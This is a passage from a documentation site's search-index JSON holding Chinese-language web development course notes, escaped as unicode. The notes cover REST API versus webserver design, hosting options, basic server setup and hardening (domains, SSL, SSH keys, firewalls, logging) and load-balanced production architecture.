\u793a\u4f8b\u3002\u5b83\u7684\u6587\u6863\u63cf\u8ff0\u4e86\u5404\u79cd\u8d44\u6e90\uff08\u5982 issues, repositories\uff09\uff0c\u4ee5\u53ca\u5982\u4f55\u4f7f\u7528 GET \u8bf7\u6c42 <code>/issues</code> \u83b7\u53d6\u5206\u914d\u7ed9\u8ba4\u8bc1\u7528\u6237\u7684 issues \u5217\u8868\uff0c\u652f\u6301\u8fc7\u6ee4\uff08\u6309 assigned, created \u7b49\uff09\u548c\u5206\u9875\uff08<code>per_page</code>, <code>page</code> \u53c2\u6570\uff09\u3002\u54cd\u5e94\u793a\u4f8b\u4f1a\u5c55\u793a\u8fd4\u56de\u6570\u636e\u7684\u7ed3\u6784\uff08JSON\uff09\uff0c\u5e76\u63d0\u4f9b\u72b6\u6001\u7801\u8bf4\u660e\u3002</p>"},{"location":"cs/mern/3403/l14/#differences-between-designing-a-rest-api-and-a-webserver","title":"Differences between Designing a REST API and a Webserver","text":"<p>\u8bbe\u8ba1 REST API \u4e0e\u8bbe\u8ba1\u63d0\u4f9b\u5b8c\u6574 Web \u754c\u9762\u7684 Web \u670d\u52a1\u5668\uff08webserver\uff09\u5b58\u5728\u5173\u952e\u5dee\u5f02\uff1a</p> <ol> <li> <p>\u8026\u5408\u5ea6:</p> <ul> <li>Web Server (\u4f20\u7edf): \u540e\u7aef\u63d0\u4f9b\u903b\u8f91\u3001\u6570\u636e\u5b58\u50a8\uff0c\u5e76\u8d1f\u8d23\u751f\u6210\u548c\u63d0\u4f9b\u56fe\u5f62\u7528\u6237\u754c\u9762 (GUI) \u7ed9\u6d4f\u89c8\u5668\u3002\u8fd9\u4f7f\u5f97\u903b\u8f91\u548c\u8868\u73b0\u5c42\u7d27\u5bc6\u8026\u5408\u3002</li> <li>REST API: \u540e\u7aef\u53ea\u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u7684\u903b\u8f91\u548c\u6570\u636e\u7ed3\u6784\u4f5c\u4e3a\u670d\u52a1\u3002\u5b83\u4e0d\u63d0\u4f9b\u6216\u6e32\u67d3 GUI\u3002GUI \u7684\u751f\u6210\u548c\u6e32\u67d3\u5de5\u4f5c\u7531\u5ba2\u6237\u7aef\uff08\u5982 Web \u6d4f\u89c8\u5668\u4e2d\u7684 JavaScript \u6846\u67b6\u3001\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u3001\u751a\u81f3\u662f\u53e6\u4e00\u4e2a Web \u670d\u52a1\u5668\uff09\u8d1f\u8d23\u6d88\u8017 API \u6570\u636e\u540e\u5b8c\u6210\u3002</li> </ul> </li> <li> <p>\u4ea4\u4ed8\u5185\u5bb9:</p> <ul> <li>Web Server: \u901a\u5e38\u54cd\u5e94 HTTP \u8bf7\u6c42\u5e76\u8fd4\u56de HTML\u3001CSS\u3001JavaScript \u6587\u4ef6\u4ee5\u53ca\u9759\u6001\u8d44\u6e90\u3002</li> <li>REST API: \u4e3b\u8981\u901a\u8fc7 HTTP \u8bf7\u6c42/\u54cd\u5e94\u4ea4\u6362\u7ed3\u6784\u5316\u6570\u636e\uff0c\u901a\u5e38\u662f JSON \u683c\u5f0f\uff0c\u800c\u4e0d\u662f\u5b8c\u6574\u7684\u7f51\u9875\u6587\u4ef6\u3002</li> </ul> </li> <li> <p>\u9519\u8bef\u5904\u7406:</p> <ul> <li>Web Server: \u9047\u5230\u9519\u8bef\u65f6\uff0c\u901a\u5e38\u4f1a\u6e32\u67d3\u5e76\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u9519\u8bef\u4fe1\u606f\u7684 HTML \u9875\u9762\u7ed9\u7528\u6237\u3002</li> <li>REST API: \u9047\u5230\u9519\u8bef\u65f6\uff0c\u4e0d\u4f1a\u8fd4\u56de\u5b8c\u6574\u7684\u7f51\u9875\uff0c\u800c\u662f\u4f7f\u7528\u6807\u51c6\u7684 HTTP \u72b6\u6001\u7801\uff08\u5982 400, 404, 500\uff09\u5e76\u5728\u54cd\u5e94\u4f53\u4e2d\u5305\u542b\u683c\u5f0f\u5316\u7684\u9519\u8bef\u4fe1\u606f\uff08\u901a\u5e38\u662f JSON\uff09\u3002</li> </ul> </li> <li> <p>\u72b6\u6001\u7ba1\u7406:</p> <ul> <li>Web Server (\u4f20\u7edf): \u867d\u7136 HTTP \u662f\u65e0\u72b6\u6001\u7684\uff0c\u4f46 Web \u670d\u52a1\u5668\u901a\u5e38\u9700\u8981\u7ba1\u7406\u7528\u6237\u4f1a\u8bdd\u72b6\u6001\uff08\u5982\u767b\u5f55\u72b6\u6001\u3001\u8d2d\u7269\u8f66\u5185\u5bb9\uff09\u3002\u8fd9\u53ef\u80fd\u9700\u8981\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u4e00\u4e9b\u72b6\u6001\u4fe1\u606f\uff0c\u8fd9\u4f1a\u589e\u52a0\u670d\u52a1\u5668\u7684\u590d\u6742\u6027\u548c\u6269\u5c55\u96be\u5ea6\u3002</li> <li>REST API: \u4e25\u683c\u9075\u5faa\u65e0\u72b6\u6001\uff08Stateless\uff09\u539f\u5219\uff0c\u670d\u52a1\u5668\u4e0d\u5b58\u50a8\u5ba2\u6237\u7aef\u7684\u4f1a\u8bdd\u72b6\u6001\u3002\u6bcf\u4e2a\u8bf7\u6c42\u5fc5\u987b\u5305\u542b\u5904\u7406\u8be5\u8bf7\u6c42\u6240\u9700\u7684\u6240\u6709\u4fe1\u606f\u3002\u72b6\u6001\u901a\u5e38\u4fdd\u5b58\u5728\u5ba2\u6237\u7aef\u6216\u4e00\u4e2a\u5171\u4eab\u7684\u5916\u90e8\u5b58\u50a8\uff08\u5982\u6570\u636e\u5e93\uff09\uff0c\u6240\u6709\u670d\u52a1\u5668\u5b9e\u4f8b\u90fd\u53ef\u4ee5\u8bbf\u95ee\u5b83\u3002\u8fd9\u4f7f\u5f97 REST API \u66f4\u6613\u4e8e\u901a\u8fc7\u6dfb\u52a0\u66f4\u591a\u670d\u52a1\u5668\u5b9e\u4f8b\u8fdb\u884c\u6c34\u5e73\u6269\u5c55\uff0c\u56e0\u4e3a\u4efb\u4f55\u8bf7\u6c42\u90fd\u53ef\u4ee5\u7531\u4efb\u4f55\u53ef\u7528\u670d\u52a1\u5668\u5904\u7406\u3002</li> </ul> </li> </ol> <p>\u5728\u4e00\u4e2a\u6846\u67b6\uff08\u5982 Flask\uff09\u4e2d\uff0c\u53ef\u4ee5\u540c\u65f6\u6784\u5efa\u4e00\u4e2a\u63d0\u4f9b\u4f20\u7edf Web \u754c\u9762\u548c REST API \u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u901a\u5e38\u901a\u8fc7\u4f7f\u7528\u84dd\u56fe (blueprints) \u7b49\u673a\u5236\u6765\u5206\u79bb API \u8def\u7531\u548c Web \u8def\u7531\u6765\u5b9e\u73b0\uff0c\u4ece\u800c\u5b9e\u73b0\u903b\u8f91\u4e0a\u7684\u5206\u79bb\uff0c\u5e76\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u5c06\u5b83\u4eec\u90e8\u7f72\u5230\u4e0d\u540c\u7684\u670d\u52a1\u5668\u5b9e\u4f8b\u4e0a\uff0c\u540c\u65f6\u5171\u4eab\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u6216\u5176\u4ed6\u540e\u7aef\u8d44\u6e90\u3002</p> <p>\u8bbe\u8ba1 REST API \u7684\u91cd\u70b9\u5728\u4e8e\u8d44\u6e90\u7684\u5b9a\u4e49\u3001URL \u7684\u8bbe\u8ba1\u3001HTTP \u65b9\u6cd5\u7684\u6b63\u786e\u4f7f\u7528\u3001\u6570\u636e\u683c\u5f0f\u7684\u7ea6\u5b9a\u4ee5\u53ca\u6e05\u6670\u7684\u6587\u6863\u3002\u8bbe\u8ba1 Web \u670d\u52a1\u5668\u7684\u91cd\u70b9\u5728\u4e8e\u7528\u6237\u754c\u9762\u7684\u5448\u73b0\u3001\u7528\u6237\u4ea4\u4e92\u6d41\u7a0b\u3001\u6a21\u677f\u6e32\u67d3\u4ee5\u53ca\u4f1a\u8bdd\u7ba1\u7406\u7b49\u3002REST API \u66f4\u4e13\u6ce8\u4e8e\u4f5c\u4e3a\u6570\u636e\u548c\u529f\u80fd\u7684\u670d\u52a1\u63d0\u4f9b\u8005\uff0c\u800c Web \u670d\u52a1\u5668\u5219\u66f4\u4e13\u6ce8\u4e8e\u7528\u6237\u4f53\u9a8c\u7684\u5448\u73b0\u3002</p>"},{"location":"cs/mern/3403/l15/","title":"15.0 Development","text":""},{"location":"cs/mern/3403/l15/#the-different-hosting-options-available-and-high-level-pros-and-cons","title":"The different hosting options available and high-level pros and cons.","text":"<p>\u5728\u5c06 Web \u5e94\u7528\u7a0b\u5e8f\u90e8\u7f72\u5230\u53ef\u4f9b\u5168\u7403\u8bbf\u95ee\u7684 URL \u4e0a\u65f6\uff0c\u60a8\u53ef\u4ee5\u9009\u62e9\u591a\u79cd\u4e3b\u673a\u6258\u7ba1\u65b9\u6848\u3002</p> <ol> <li> <p>Running your own server (\u8fd0\u884c\u81ea\u5df1\u7684\u670d\u52a1\u5668):</p> <ul> <li>Description: \u7269\u7406\u8d2d\u4e70\u4e00\u53f0\u673a\u5668\u4e13\u95e8\u8fd0\u884c\u60a8\u7684\u7f51\u7ad9\u3002\u8fc7\u53bb\u6210\u672c\u5f88\u9ad8\uff0c\u4f46\u73b0\u5728\u4f7f\u7528\u6811\u8393\u6d3e (Raspberry Pi) \u6216\u7c7b\u4f3c\u5c0f\u578b\u8ba1\u7b97\u673a\u53d8\u5f97\u66f4\u53ef\u884c\u3002\u6811\u8393\u6d3e\u6210\u672c\u4e0d\u5230 60 \u7f8e\u5143\uff0c\u6027\u80fd\u8db3\u4ee5\u9a71\u52a8\u4e00\u4e2a\u5c0f\u578b Web \u670d\u52a1\u5668\u3002\u5b83\u8fd0\u884c Linux \u53d8\u79cd (Raspbian)\uff0c\u53ef\u50cf\u666e\u901a Linux \u670d\u52a1\u5668\u4e00\u6837\u914d\u7f6e\u3002\u521d\u59cb\u914d\u7f6e\u9700\u8981\u952e\u76d8\u548c\u663e\u793a\u5668\uff0c\u4e4b\u540e\u53ef\u901a\u8fc7 SSH \u8bbf\u95ee\u3002</li> <li>Pros: \u7406\u8bba\u4e0a\u5b8c\u5168\u63a7\u5236\u3002\u6210\u672c\u76f8\u5bf9\u8f83\u4f4e\uff08\u5c24\u5176\u662f\u6811\u8393\u6d3e\uff09\u3002</li> <li>Cons: \u60a8\u9700\u8981\u7ba1\u7406\u7269\u7406\u57fa\u7840\u8bbe\u65bd\u3002\u8fd9\u53f0\u673a\u5668\u9700\u8981 24/7 \u8fd0\u884c\uff0c\u5e76\u4e14\u53ef\u9760\u6027\u8981\u9ad8\uff0c\u4e0d\u80fd\u8fd0\u884c\u5176\u4ed6\u53ef\u80fd\u5bfc\u81f4\u5d29\u6e83\u7684\u8fdb\u7a0b\u3002\u4e0d\u5efa\u8bae\u7528\u4e8e\u9664\u4e2a\u4eba\u7231\u597d\u670d\u52a1\u5668\u4ee5\u5916\u7684\u7528\u9014\u3002</li> </ul> </li> <li> <p>A Linux virtual machine (Linux \u865a\u62df\u673a):</p> <ul> <li>Description: \u5411\u6258\u7ba1\u670d\u52a1\u5546\u79df\u8d41\u4e00\u53f0\u865a\u62df\u7684\u7269\u7406\u673a\u5668\u3002\u60a8\u83b7\u5f97\u5b8c\u6574\u7684\u8ba1\u7b97\u673a\u8bbf\u95ee\u6743\uff0c\u901a\u5e38\u53ef\u901a\u8fc7 SSH \u8bbf\u95ee\u64cd\u4f5c\u7cfb\u7edf\u3002\u53ef\u4ee5\u5728\u547d\u4ee4\u884c\u914d\u7f6e\u548c\u90e8\u7f72\u5e94\u7528\u7a0b\u5e8f\u3002\u63d0\u4f9b\u5546\u5305\u62ec Amazon, Digital Ocean, A2, Azure, AliBaba \u7b49\u3002</li> <li>Pros: \u6210\u672c\u76f8\u5bf9\u4fbf\u5b9c\uff0c\u6bcf\u6708\u7ea6 10 \u7f8e\u5143\u5373\u53ef\u79df\u8d41\u3002\u60a8\u65e0\u9700\u62c5\u5fc3\u7269\u7406\u57fa\u7840\u8bbe\u65bd\u7684\u7ba1\u7406\u3002\u516c\u53f8\u4f1a\u4fdd\u8bc1\u673a\u5668\u7684\u6b63\u5e38\u8fd0\u884c\uff08uptime\uff09\u3002</li> <li>Cons: \u60a8\u4ecd\u7136\u9700\u8981\u81ea\u5df1\u8bbe\u7f6e\u548c\u914d\u7f6e\u6574\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u73af\u5883\u6765\u8fd0\u884c\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ul> </li> <li> <p>Platform-as-a-Service (PaaS) (\u5e73\u53f0\u5373\u670d\u52a1):</p> <ul> <li>Description: \u8fd9\u7c7b\u670d\u52a1\u4e0d\u63d0\u4f9b\u5b8c\u6574\u7684\u64cd\u4f5c\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff0c\u800c\u662f\u63d0\u4f9b\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u60a8\u7684\u4ee3\u7801\u6216\u5e94\u7528\u7a0b\u5e8f\u7684\u73af\u5883\u3002\u5b83\u4eec\u53ef\u80fd\u4e0d\u6620\u5c04\u5230\u5355\u4e00\u7269\u7406\u673a\u5668\uff0c\u800c\u662f\u5728\u63d0\u4f9b\u5546\u7684\u6570\u636e\u4e2d\u5fc3\u5171\u4eab\u8d44\u6e90\u3002\u5bb9\u5668 (Containers) \u662f\u5b9e\u73b0 PaaS \u7684\u4e3b\u8981\u6280\u672f\uff0c\u5b83\u5c06\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u6240\u6709\u4f9d\u8d56\u9879\u6253\u5305\u5728\u4e00\u4e2a\u53ef\u79fb\u690d\u7684\u201c\u76d2\u5b50\u201d\u4e2d\uff0c\u786e\u4fdd\u5728\u4e0d\u540c\u73af\u5883\u4e2d\u4e00\u81f4\u8fd0\u884c\u3002</li> <li>Pros: \u5f88\u5927\u7a0b\u5ea6\u4e0a\u65e0\u9700\u8bbe\u7f6e\u670d\u52a1\u5668\u3001\u7ba1\u7406\u5b58\u50a8\u548c\u7ef4\u62a4\u57fa\u7840\u8bbe\u65bd\u3002\u4e3a\u60a8\u7ba1\u7406\u670d\u52a1\u5668\u673a\u5668\u3002\u5bb9\u6613\u542f\u52a8\u548c\u8fd0\u884c\u9879\u76ee\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece Git \u4ed3\u5e93\u90e8\u7f72\u4ee3\u7801\u3002</li> <li>Cons: \u51e0\u4e4e\u603b\u662f\u6309\u4f7f\u7528\u4ed8\u8d39\uff0c\u5e76\u968f\u8fd0\u884c\u65f6\u95f4\u6536\u8d39\u3002\u8bb8\u591a\u6709\u514d\u8d39\u6216\u7231\u597d\u5c42\u7ea7\uff0c\u4f46\u529f\u80fd\u53d7\u9650\u6216\u6027\u80fd\u8f83\u4f4e\u3002\u53ef\u80fd\u5bf9\u652f\u6301\u7684\u64cd\u4f5c\u7cfb\u7edf/\u8bed\u8a00\u6709\u9650\u5236\u3002\u5bb9\u5668\u901a\u5e38\u6ca1\u6709\u6301\u4e45\u6027\u5185\u5b58\uff0c\u9700\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u4e91\u6570\u636e\u5e93\u3002Docker \u548c Heroku \u662f\u5e38\u89c1\u7684\u5fae\u6258\u7ba1\uff08micro-hosting\uff09\u89e3\u51b3\u65b9\u6848\uff0c\u63d0\u4f9b\u5bb9\u5668\u4f5c\u4e3a\u670d\u52a1\uff08software as a service\uff09\u3002Heroku \u4ee5\u6613\u7528\u6027\u8457\u79f0\uff0c\u53ef\u4ee5\u76f4\u63a5\u50cf Git \u4ed3\u5e93\u4e00\u6837\u63a8\u9001\u4ee3\u7801\u8fdb\u884c\u90e8\u7f72\uff0c\u4f46\u58f0\u8a89\u662f\u76f8\u5bf9\u8f83\u8d35\uff0c\u4e5f\u6709\u514d\u8d39\u66ff\u4ee3\u54c1\u5982 PythonAnywhere\u3002</li> </ul> </li> </ol> <p>Containers:</p> <ul> <li>\u89e3\u51b3\u4e86\u7248\u672c\u63a7\u5236\u3001\u5305\u7ba1\u7406\u548c\u8de8\u5e73\u53f0\u53ef\u9760\u6027\u95ee\u9898\u3002</li> <li>\u6807\u51c6\u5316\u4e86\u8f6f\u4ef6\u53ca\u5176\u6240\u6709\u4f9d\u8d56\u9879\uff0c\u65e0\u8bba\u5728\u54ea\u91cc\u8fd0\u884c\u90fd\u80fd\u4fdd\u6301\u4e00\u81f4\u3002</li> <li>Docker \u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4f7f\u7528\u5bb9\u5668\u955c\u50cf (images) \u548c Docker Engine\u3002\u901a\u8fc7 Dockerfile \u811a\u672c\u6765\u5b9a\u4e49\u5bb9\u5668\u73af\u5883\u3002\u63d0\u4f9b\u53ef\u91cd\u590d\u7684\u6784\u5efa\u3002</li> <li>Heroku \u4e5f\u662f\u4e00\u4e2a\u57fa\u4e8e\u5bb9\u5668\u7684\u4e91\u5e73\u53f0\uff0c\u53ef\u4ee5\u76f4\u63a5\u4ece Git \u4ed3\u5e93\u5b89\u88c5\u4ee3\u7801\u548c\u4f9d\u8d56\u3002</li> </ul>"},{"location":"cs/mern/3403/l15/#the-basic-steps-needed-to-configure-a-server-eg-obtain-a-domain-name-ssl-certificate-setup-logging","title":"The basic steps needed to configure a server (e.g. obtain a Domain Name, SSL certificate, setup logging)","text":"<p>\u4e00\u65e6\u60a8\u83b7\u5f97\u4e86\u6258\u7ba1\u673a\u5668\uff0c\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u57fa\u672c\u914d\u7f6e\u624d\u80fd\u901a\u8fc7\u4e92\u8054\u7f51\u8bbf\u95ee\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <ol> <li> <p>Obtaining a domain name (\u83b7\u53d6\u57df\u540d):</p> <ul> <li>Description: \u57df\u540d\u662f\u60a8\u7f51\u7ad9\u7684 URL \u90e8\u5206 (\u4f8b\u5982 <code>google.com</code>)\u3002\u5b83\u5206\u4e3a\u9876\u7ea7\u57df\u540d (Top-level domain, TLD)\uff0c\u5982 <code>.com</code>, <code>.au</code>, <code>.net</code>\uff0c\u548c\u4e8c\u7ea7\u57df\u540d (Second-level domain, SLD)\uff0c\u5982 <code>google</code>, <code>uwa</code>, <code>facebook</code>\u3002</li> <li>Process: \u57df\u540d\u9700\u8981\u8d2d\u4e70\uff08\u5b9e\u9645\u4e0a\u662f\u79df\u7528\uff09\u3002\u6210\u672c\u53d6\u51b3\u4e8e TLD\uff0c<code>.com</code> \u901a\u5e38\u6700\u8d35\u3002SLD \u51b3\u5b9a\u4e86\u60a8\u7684\u54c1\u724c\uff0c\u77ed\u4e14\u6613\u8bb0\u7684\u57df\u540d\u66f4\u597d\u3002\u60a8\u53ef\u4ee5\u5728\u7ebf\u68c0\u67e5\u57df\u540d\u53ef\u7528\u6027\u3002\u901a\u8fc7\u4e0e ICANN \u5173\u8054\u7684\u57df\u540d\u6ce8\u518c\u5546 (Domain Registrar) \u8d2d\u4e70\u3002\u57df\u540d\u662f\u6309\u5e74\u79df\u7528\u7684\uff0c\u9700\u8981\u8bb0\u5f97\u7eed\u8d39\uff0c\u5426\u5219\u4f1a\u5931\u6548\u3002</li> </ul> </li> <li> <p>Obtaining an SSL certificate (\u83b7\u53d6 SSL \u8bc1\u4e66):</p> <ul> <li>Description: SSL \u8bc1\u4e66\u7528\u4e8e\u8bc1\u660e\u60a8\u7f51\u7ad9\u7684\u8eab\u4efd\uff0c\u542f\u7528 HTTPS (\u5b89\u5168 HTTP) \u4ee5\u52a0\u5bc6\u7528\u6237\u6d41\u91cf\u3002\u5b83\u80fd\u9632\u6b62\u4e2d\u95f4\u4eba\u653b\u51fb\u548c\u8eab\u4efd\u5192\u5145\u3002</li> <li>Process: \u5728\u60a8\u7684\u670d\u52a1\u5668\u4e0a\u751f\u6210\u4e00\u4e2a\u516c\u5171/\u79c1\u6709\u5bc6\u94a5\u5bf9\u3002\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u60a8\u7684\u516c\u5171\u5bc6\u94a5\u3001\u57df\u540d\u7b49\u4fe1\u606f\u7684\u8bc1\u4e66\u7b7e\u540d\u8bf7\u6c42 (Certificate Signing Request, CSR)\u3002\u5c06 CSR \u63d0\u4ea4\u7ed9\u8bc1\u4e66\u9881\u53d1\u673a\u6784 (Certificate Authority, CA)\uff0c\u5982 Let's Encrypt (\u514d\u8d39)\u3002CA \u4f1a\u9a8c\u8bc1\u60a8\u7684\u4fe1\u606f\uff0c\u7136\u540e\u9881\u53d1 SSL \u8bc1\u4e66\u3002\u5c06\u8bc1\u4e66\u5b89\u88c5\u5230\u60a8\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u5e76\u914d\u7f6e\u5c06\u6240\u6709 HTTP \u6d41\u91cf\u91cd\u5b9a\u5411\u5230 HTTPS\u3002\u8fd9\u5bf9\u4e8e\u5904\u7406\u7528\u6237\u6570\u636e\u81f3\u5173\u91cd\u8981\u3002</li> </ul> </li> <li> <p>Securing your server (\u4fdd\u62a4\u670d\u52a1\u5668):</p> <ul> <li>Description: \u7531\u4e8e\u670d\u52a1\u5668\u662f\u516c\u5f00\u53ef\u8bbf\u95ee\u7684\uff0c\u9700\u8981\u91c7\u53d6\u63aa\u65bd\u9501\u5b9a\u5b83\u3002</li> <li>Steps:<ul> <li>Remove passwords for login and use key files instead (\u53d6\u6d88\u5bc6\u7801\u767b\u5f55\uff0c\u6539\u7528\u5bc6\u94a5\u6587\u4ef6): \u4f7f\u7528\u66f4\u5b89\u5168\u7684\u516c\u5171/\u79c1\u6709\u5bc6\u94a5\u5bf9\u8fdb\u884c SSH \u8ba4\u8bc1\uff0c\u800c\u975e\u5bc6\u7801\u3002</li> <li>Disable root logins (\u7981\u7528 root \u767b\u5f55): \u9632\u6b62\u4efb\u4f55\u4eba\u4ee5 root \u7528\u6237\u83b7\u5f97\u670d\u52a1\u5668\u7684\u5b8c\u5168\u63a7\u5236\u6743\u3002</li> <li>Use a firewall to only accept traffic on specific ports (\u4f7f\u7528\u9632\u706b\u5899\u9650\u5236\u7aef\u53e3): \u914d\u7f6e\u9632\u706b\u5899\u53ea\u5141\u8bb8 SSH (\u7aef\u53e3 22)\u3001HTTP (\u7aef\u53e3 80) \u548c HTTPS (\u7aef\u53e3 443) \u7684\u6d41\u91cf\u901a\u8fc7\u3002\u6076\u610f\u7528\u6237\u4f1a\u626b\u63cf\u5f00\u653e\u7aef\u53e3\u5bfb\u627e\u6f0f\u6d1e\u3002</li> <li>Route all web requests through HTTPS (\u901a\u8fc7 HTTPS \u8def\u7531\u6240\u6709 Web \u8bf7\u6c42): HTTP \u6d41\u91cf\u4ee5\u7eaf\u6587\u672c\u4f20\u8f93\uff0c\u5bb9\u6613\u88ab\u622a\u83b7\u3002\u5f3a\u5236\u4f7f\u7528 HTTPS \u53ef\u786e\u4fdd\u6d41\u91cf\u52a0\u5bc6\u3002</li> </ul> </li> </ul> </li> <li> <p>Logging (\u65e5\u5fd7\u8bb0\u5f55):</p> <ul> <li>Description: \u670d\u52a1\u5668 24/7 \u8fd0\u884c\uff0c\u65e0\u6cd5\u6301\u7eed\u76d1\u63a7\u3002\u8bb0\u5f55\u63a5\u6536\u7684\u8bf7\u6c42\u548c\u6267\u884c\u7684\u64cd\u4f5c\u975e\u5e38\u6709\u4ef7\u503c\u3002</li> <li>Value: \u5e2e\u52a9\u4e86\u89e3\u7528\u6237\u5982\u4f55\u4e0e\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92 (\u9700\u6c42\u3001\u9ad8\u5cf0\u65f6\u6bb5\u3001\u53d7\u6b22\u8fce\u7684\u529f\u80fd)\u3002\u5e2e\u52a9\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u53d7\u5230\u653b\u51fb\u3002Flask \u5e26\u6709\u5185\u7f6e\u65e5\u5fd7\u5305\u3002</li> <li>Concerns:<ul> <li>Log format (\u65e5\u5fd7\u683c\u5f0f): \u673a\u5668\u53ef\u8bfb\u6027\u901a\u5e38\u6bd4\u4eba\u7c7b\u53ef\u8bfb\u6027\u66f4\u91cd\u8981\uff0c\u56e0\u4e3a\u65e5\u5fd7\u6570\u636e\u91cf\u5de8\u5927\u3002</li> <li>Avoiding sensitive/private information (\u907f\u514d\u8bb0\u5f55\u654f\u611f/\u79c1\u6709\u4fe1\u606f): \u5207\u52ff\u5728\u65e5\u5fd7\u4e2d\u5b58\u50a8\u5bc6\u7801\u7b49\u654f\u611f\u4fe1\u606f\uff0c\u8fd9\u4f1a\u7ed5\u8fc7\u6570\u636e\u5e93\u7684\u5b89\u5168\u63aa\u65bd\uff0c\u4e5f\u53ef\u80fd\u8fdd\u53cd\u6570\u636e\u4fdd\u62a4\u6cd5\u5f8b\u3002</li> <li>Pruning your log files (\u4fee\u526a\u65e5\u5fd7\u6587\u4ef6): \u65e5\u5fd7\u6587\u4ef6\u589e\u957f\u5f88\u5feb\uff0c\u9700\u8981\u5b9a\u671f\u6e05\u7406\u6216\u5f52\u6863\u65e7\u7684\u65e5\u5fd7\u3002</li> </ul> </li> </ul> </li> </ol>"},{"location":"cs/mern/3403/l15/#how-the-server-and-database-architecture-is-structured-on-a-large-scale-production-server-and-the-purpose-of-the-individual-components-eg-database-server-reverse-proxy-server","title":"How the server and database architecture is structured on a large-scale production server and the purpose of the individual components (e.g. database server, reverse proxy server).","text":"<p>\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u4e3a\u4e86\u5904\u7406\u5927\u91cf\u6d41\u91cf\u548c\u63d0\u9ad8\u53ef\u9760\u6027\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u67b6\u6784\u901a\u5e38\u4f1a\u6bd4\u7b80\u5355\u7684\u5ba2\u6237\u7aef-\u5355\u4e00\u670d\u52a1\u5668\u6a21\u578b\u590d\u6742\u5f97\u591a\u3002</p> <ol> <li> <p>Client-Server architecture re-cap (\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u67b6\u6784\u56de\u987e):</p> <ul> <li>\u57fa\u672c\u6a21\u578b\u662f\u4e00\u4e2a\u670d\u52a1\u5668\u670d\u52a1\u591a\u4e2a\u5ba2\u6237\u7aef\u3002</li> </ul> </li> <li> <p>Specialised database hardware (\u4e13\u7528\u6570\u636e\u5e93\u786c\u4ef6):</p> <ul> <li>\u5728\u5927\u578b\u67b6\u6784\u4e2d\uff0c\u6570\u636e\u5e93\u901a\u5e38\u5b58\u50a8\u5728\u4e0e Web \u670d\u52a1\u5668\u4e0d\u540c\u7684\u4e13\u7528\u8ba1\u7b97\u673a\u4e0a\u3002</li> <li>Advantages:<ul> <li>\u53ef\u4ee5\u901a\u8fc7\u4e3a\u6570\u636e\u5e93\u4f18\u5316\u786c\u4ef6\u6765\u63d0\u9ad8\u6027\u80fd\u3002</li> <li>\u5141\u8bb8\u591a\u4e2a Web \u670d\u52a1\u5668\u8bbf\u95ee\u540c\u4e00\u4e2a\u6570\u636e\u5e93\u3002\u8fd9\u4e3a\u4e0b\u4e00\u6b65\u6269\u5c55\u5960\u5b9a\u4e86\u57fa\u7840\u3002</li> </ul> </li> </ul> </li> <li> <p>Load balancer and multiple servers (\u8d1f\u8f7d\u5747\u8861\u5668\u548c\u591a\u670d\u52a1\u5668):</p> <ul> <li>\u968f\u7740\u5e94\u7528\u7a0b\u5e8f\u6d41\u91cf\u589e\u957f\uff0c\u5355\u4e2a\u670d\u52a1\u5668\u65e0\u6cd5\u5904\u7406\u6240\u6709\u8bf7\u6c42\u3002</li> <li>Description: \u4f7f\u7528\u591a\u4e2a\u8fd0\u884c\u5b8c\u5168\u76f8\u540c\u5e94\u7528\u7a0b\u5e8f\u7684\u670d\u52a1\u5668\u3002\u5728\u8fd9\u4e9b\u670d\u52a1\u5668\u524d\u9762\u8bbe\u7f6e\u4e00\u4e2a Load balancer\u3002</li> <li>Purpose: \u8d1f\u8f7d\u5747\u8861\u5668\u63a5\u6536\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u5c06\u5176\u5206\u914d\uff08\"farms off\"\uff09\u5230\u540e\u9762\u7684\u591a\u4e2a\u670d\u52a1\u5668\u4e2d\u7684\u4e00\u4e2a\u3002</li> <li>Benefits: \u663e\u7740\u63d0\u9ad8\u541e\u5410\u91cf\uff0c\u53ef\u4ee5\u5904\u7406\u66f4\u591a\u8bf7\u6c42\u3002\u5bf9\u7528\u6237\u800c\u8a00\uff0c\u8d1f\u8f7d\u5747\u8861\u5668\u5c31\u662f\u670d\u52a1\u5668\uff0c\u4ed6\u4eec\u65e0\u9700\u77e5\u9053\u8bf7\u6c42\u88ab\u5206\u914d\u5230\u54ea\u4e2a\u5177\u4f53\u670d\u52a1\u5668\u3002</li> </ul> </li> <li> <p>Reverse-proxy server (\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668):</p> <ul> <li>Description: \u5982\u679c\u8d1f\u8f7d\u5747\u8861\u5668\u9664\u4e86\u5206\u914d\u8bf7\u6c42\u4e4b\u5916\u8fd8\u6267\u884c\u5176\u4ed6\u4efb\u52a1\uff0c\u5b83\u5c31\u88ab\u79f0\u4e3a\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u3002\u5b83\u5145\u5f53\u540e\u7aef\u5b9e\u9645\u903b\u8f91\u670d\u52a1\u5668\u7684\u4ee3\u7406\u3002</li> <li>Purpose and additional jobs:<ul> <li>Serve static content 